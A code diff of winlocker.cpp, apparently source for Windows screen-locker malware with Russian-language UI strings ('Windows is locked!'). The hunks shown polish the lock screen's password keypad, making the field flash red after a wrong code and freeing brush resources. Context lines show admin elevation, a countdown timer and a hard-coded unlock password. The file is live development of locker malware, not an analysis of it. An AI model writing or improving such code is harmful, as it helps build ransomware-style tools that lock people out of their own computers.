@@ -1,13 +1,9 @@
 // winlocker.cpp
 #include <windows.h>
 #include <winuser.h>
-#include <iostream>
 #include <string>
 #include <thread>
 #include <chrono>
-#include <ctime>
-#include <fstream>
-#include <shlobj.h>
 #include <tlhelp32.h>
 #include <commctrl.h>
 #include <psapi.h>
@@ -20,6 +16,7 @@
 #pragma comment(lib, "comctl32.lib")
 #pragma comment(lib, "psapi.lib")
 #pragma comment(lib, "netapi32.lib")
+#pragma comment(lib, "gdi32.lib")
 
 using namespace std;
 
@@ -55,19 +52,6 @@ void UpdateTimer();
 bool IsAdmin();
 void RunAsAdmin();
 LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
-void SetEditBackground(HWND hEdit, COLORREF color);
-
-// ==================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ====================
-void SetEditBackground(HWND hEdit, COLORREF color) {
-    HDC hdc = GetDC(hEdit);
-    HBRUSH hBrush = CreateSolidBrush(color);
-    RECT rect;
-    GetClientRect(hEdit, &rect);
-    FillRect(hdc, &rect, hBrush);
-    DeleteObject(hBrush);
-    ReleaseDC(hEdit, hdc);
-    InvalidateRect(hEdit, NULL, TRUE);
-}
 
 // ==================== АДМИН ====================
 bool IsAdmin() {
@@ -347,9 +331,15 @@ void UpdateTimer() {
 
 // ==================== ОКОННАЯ ФУНКЦИЯ ====================
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
+    static HBRUSH hBrushRed = NULL;
+    static HBRUSH hBrushDefault = NULL;
+    
     switch (msg) {
         case WM_CREATE: {
             HINSTANCE hInst = (HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE);
+            
+            hBrushRed = CreateSolidBrush(RGB(80, 0, 0));
+            hBrushDefault = CreateSolidBrush(RGB(64, 64, 64));
             
             // Заголовок
             HWND hTitle = CreateWindowA("STATIC", "Windows заблокирован!",
@@ -418,6 +408,20 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
             UpdateTimer();
             break;
         }
+        case WM_CTLCOLORSTATIC:
+        case WM_CTLCOLOREDIT: {
+            HWND hWnd = (HWND)lParam;
+            if (hWnd == hInput) {
+                if (g_password != "" && g_password != CORRECT_PASS) {
+                    SetBkColor((HDC)wParam, RGB(80, 0, 0));
+                    return (LRESULT)hBrushRed;
+                } else {
+                    SetBkColor((HDC)wParam, RGB(64, 64, 64));
+                    return (LRESULT)hBrushDefault;
+                }
+            }
+            break;
+        }
         case WM_COMMAND: {
             int id = LOWORD(wParam);
             if (id >= ID_BTN_BASE && id < ID_BTN_BASE + 10) {
@@ -426,10 +430,12 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
                     g_password += char('0' + num);
                     string stars(g_password.length(), '*');
                     SetWindowTextA(hInput, stars.c_str());
+                    InvalidateRect(hInput, NULL, TRUE);
                 }
             } else if (id == ID_CLEAR) {
                 g_password.clear();
                 SetWindowTextA(hInput, "");
+                InvalidateRect(hInput, NULL, TRUE);
             } else if (id == ID_OK) {
                 if (g_password == CORRECT_PASS) {
                     g_unlocked = true;
@@ -446,13 +452,13 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
                 } else {
                     g_password.clear();
                     SetWindowTextA(hInput, "");
-                    // Красный фон через SetWindowLong
-                    HBRUSH hBrush = CreateSolidBrush(RGB(255, 0, 0));
+                    InvalidateRect(hInput, NULL, TRUE);
+                    // Красный фон на 300ms
+                    HBRUSH hBrush = CreateSolidBrush(RGB(80, 0, 0));
                     SetClassLongPtr(hInput, GCLP_HBRBACKGROUND, (LONG_PTR)hBrush);
                     InvalidateRect(hInput, NULL, TRUE);
                     Sleep(300);
-                    hBrush = CreateSolidBrush(RGB(64, 64, 64));
-                    SetClassLongPtr(hInput, GCLP_HBRBACKGROUND, (LONG_PTR)hBrush);
+                    SetClassLongPtr(hInput, GCLP_HBRBACKGROUND, (LONG_PTR)hBrushDefault);
                     InvalidateRect(hInput, NULL, TRUE);
                 }
             }
@@ -465,6 +471,8 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
             break;
         }
         case WM_DESTROY: {
+            DeleteObject(hBrushRed);
+            DeleteObject(hBrushDefault);
             PostQuitMessage(0);
             break;
         }
